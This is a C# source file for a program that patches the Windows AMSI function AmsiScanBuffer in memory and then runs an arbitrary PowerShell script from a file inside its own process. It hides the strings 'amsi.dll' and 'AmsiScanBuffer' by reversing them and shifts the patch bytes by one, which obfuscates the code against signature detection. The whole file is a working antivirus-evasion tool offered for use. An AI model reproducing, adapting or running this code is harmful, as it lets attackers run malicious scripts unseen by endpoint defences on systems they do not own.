using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Collections.ObjectModel;
using System.Management.Automation.Runspaces;
using System.IO;
using System.Runtime.InteropServices;

namespace unmanagedps
{
    class Program
    {
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("msvcrt.dll", EntryPoint = "memcpy", CallingConvention = CallingConvention.Cdecl, SetLastError = false)]
        public static extern IntPtr memcpy(IntPtr dest, IntPtr src, UIntPtr count);

        static void Main(string[] args)
        {
            char[] data = "lld.isma".ToCharArray();
            Array.Reverse(data);
            string name = new string(data);

            IntPtr a = LoadLibrary(name);
            data = "reffuBnacSismA".ToCharArray();
            Array.Reverse(data);
            name = new String(data);
            IntPtr ptr = GetProcAddress(a, name);
            Byte[] newbytes = { 0xB9, 0x58, 0x01, 0x08, 0x81, 0xC3, 0x19, 0x01 };
  
            Console.WriteLine("patching offset 0x{0}", ptr.ToString("X2"));

            uint retval = 0;
            uint newval = 0;
            newval++;
            newval += 3;

            VirtualProtect(ptr, (UIntPtr)newbytes.Length, newval, out retval);
            for (var i = 0; i < newbytes.Length; i++)
            {
                newbytes[i] = (byte)((int)newbytes[i] - 1);
            }
            Marshal.Copy(newbytes, 0, ptr, newbytes.Length);

            newval += 28;
            VirtualProtect(ptr, (UIntPtr)newbytes.Length, newval, out retval);
           

            StringBuilder sb = new StringBuilder();
            try
            {
                Runspace rs = RunspaceFactory.CreateRunspace();
                rs.Open();

                RunspaceInvoke ri = new RunspaceInvoke(rs);

                Pipeline pipe = rs.CreatePipeline();
                pipe.Commands.AddScript(File.ReadAllText(args[0]) + "; " + args[1]);
                pipe.Commands.Add("Out-String");
                Collection<PSObject> output = pipe.Invoke();
                rs.Close();
                foreach (PSObject line in output)
                {
                    sb.AppendLine(line.ToString());
                }
                Console.WriteLine(sb.ToString());
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
    }
}
